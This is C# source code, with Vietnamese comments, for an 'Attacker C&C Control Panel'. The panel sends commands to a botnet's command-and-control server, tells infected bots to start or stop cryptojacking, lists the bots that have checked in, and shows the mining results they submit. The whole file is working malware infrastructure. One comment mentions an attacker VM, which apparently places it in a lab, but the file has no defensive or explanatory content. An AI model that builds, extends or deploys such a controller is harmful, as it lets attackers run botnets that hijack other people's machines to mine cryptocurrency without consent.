using System;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading.Tasks;
using System.Collections.Generic;

// =======================================================
// === BẢNG ĐIỀU KHIỂN CỦA ATTACKER (GIAO DIỆN MỚI)    ===
// =======================================================

// === Bổ sung: Các class model để phân tích dữ liệu JSON từ server ===
public class BotInfo
{
    [JsonPropertyName("botId")]
    public string BotId { get; set; }

    [JsonPropertyName("lastSeen")]
    public DateTime LastSeen { get; set; }

    [JsonPropertyName("status")]
    public string Status { get; set; }
}

public class CryptoJackResult
{
    [JsonPropertyName("botId")]
    public string BotId { get; set; }

    [JsonPropertyName("nonce")]
    public long Nonce { get; set; }

    [JsonPropertyName("hash")]
    public string Hash { get; set; }

    [JsonPropertyName("timestamp")]
    public DateTime Timestamp { get; set; }
}


public class AttackerControlPanel
{
    // !!! QUAN TRỌNG: Đặt địa chỉ IP của máy ATTACKER VM vào đây
    private static readonly string CncServerIp = "127.0.0.1";
    private static readonly string CncServerUrl = $"http://{CncServerIp}:8000";

    private static readonly HttpClient client = new HttpClient();

    static async Task Main(string[] args)
    {
        Console.Title = "Attacker C&C Control Panel";

        while (true)
        {
            ShowHeader();
            ShowMenu();

            Console.Write("Enter your choice: ");
            string choice = Console.ReadLine();

            // Xóa màn hình trước khi xử lý để giao diện sạch sẽ
            Console.Clear();
            ShowHeader(); // Hiển thị lại header để giữ ngữ cảnh

            bool shouldExit = await ProcessChoice(choice);
            if (shouldExit)
            {
                break;
            }

            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("\nPress any key to return to the menu...");
            Console.ReadKey();
        }

        Console.WriteLine("Control panel shutting down.");
    }

    static void ShowHeader()
    {
        Console.Clear();
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("ATTACKER COMMAND & CONTROL (C&C) PANEL");
        Console.WriteLine($"Server Target: {CncServerUrl}");
        Console.ResetColor();
        Console.WriteLine();
    }

    static void ShowMenu()
    {
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("--- Bot Commands ---");
        Console.ResetColor();
        Console.WriteLine(" [1] Issue Command: CRYPTOJACK (Start mining)");
        Console.WriteLine(" [2] Issue Command: IDLE (Stop all tasks)");

        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("\n--- Monitoring ---");
        Console.ResetColor();
        Console.WriteLine(" [3] List all active Bots");
        Console.WriteLine(" [4] View collected Results");

        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("\n--- System ---");
        Console.ResetColor();
        Console.WriteLine(" [5] Refresh Menu");
        Console.WriteLine(" [0] Exit Panel");
        Console.WriteLine();
    }

    static async Task<bool> ProcessChoice(string choice)
    {
        switch (choice)
        {
            case "1":
                await SendCommandToServer("cryptojack");
                break;
            case "2":
                await SendCommandToServer("idle");
                break;
            case "3":
                await ListBots();
                break;
            case "4":
                await ViewResults();
                break;
            case "5":
                // Chỉ cần tiếp tục vòng lặp là sẽ tự động làm mới
                return false;
            case "0":
                return true; // Tín hiệu để thoát chương trình
            default:
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid choice. Please select a valid option from the menu.");
                Console.ResetColor();
                break;
        }
        return false;
    }

    static async Task SendCommandToServer(string command)
    {
        Console.WriteLine($"Issuing command '{command}'...");
        try
        {
            var payload = new { Command = command };
            var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
            HttpResponseMessage response = await client.PostAsync($"{CncServerUrl}/bot/setcommand", content);

            if (response.IsSuccessStatusCode)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"SUCCESS: Command '{command}' was accepted by the server.");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"FAILED: Server returned status {response.StatusCode}.");
            }
        }
        catch (Exception ex)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"ERROR: Could not connect to the server. Details: {ex.Message}");
        }
        finally
        {
            Console.ResetColor();
        }
    }

    static async Task ListBots()
    {
        Console.WriteLine("Fetching bot list from server...");
        try
        {
            string jsonResponse = await client.GetStringAsync($"{CncServerUrl}/bot/list");
            var bots = JsonSerializer.Deserialize<List<BotInfo>>(jsonResponse);

            if (bots == null || bots.Count == 0)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("No bots have checked in yet.");
                Console.ResetColor();
                return;
            }

            // In tiêu đề cho bảng
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine($"\n--- Found {bots.Count} Bot(s) ---");
            Console.WriteLine($"{"Bot ID",-38}{"Last Seen (UTC)",-25}{"Status"}");
            Console.WriteLine(new string('-', 80));
            Console.ResetColor();

            // In thông tin từng bot
            foreach (var bot in bots)
            {
                var timeAgo = DateTime.UtcNow - bot.LastSeen;
                Console.WriteLine($"{bot.BotId,-38}{bot.LastSeen,-25:yyyy-MM-dd HH:mm:ss}{bot.Status} ({(int)timeAgo.TotalSeconds}s ago)");
            }
        }
        catch (Exception ex)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"ERROR: Could not fetch bot list. Details: {ex.Message}");
            Console.ResetColor();
        }
    }

    static async Task ViewResults()
    {
        Console.WriteLine("Fetching results from server...");
        try
        {
            string jsonResponse = await client.GetStringAsync($"{CncServerUrl}/bot/results");
            var results = JsonSerializer.Deserialize<List<CryptoJackResult>>(jsonResponse);

            if (results == null || results.Count == 0)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("No results have been submitted yet.");
                Console.ResetColor();
                return;
            }

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine($"\n--- Found {results.Count} Result(s) ---");
            Console.WriteLine($"{"Timestamp (UTC)",-25}{"Bot ID",-38}{"Nonce",-12}{"Hash"}");
            Console.WriteLine(new string('-', 120));
            Console.ResetColor();

            foreach (var result in results)
            {
                Console.WriteLine($"{result.Timestamp,-25:yyyy-MM-dd HH:mm:ss}{result.BotId,-38}{result.Nonce,-12}{result.Hash.Substring(0, 16)}...");
            }
        }
        catch (Exception ex)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"ERROR: Could not fetch results. Details: {ex.Message}");
            Console.ResetColor();
        }
    }
}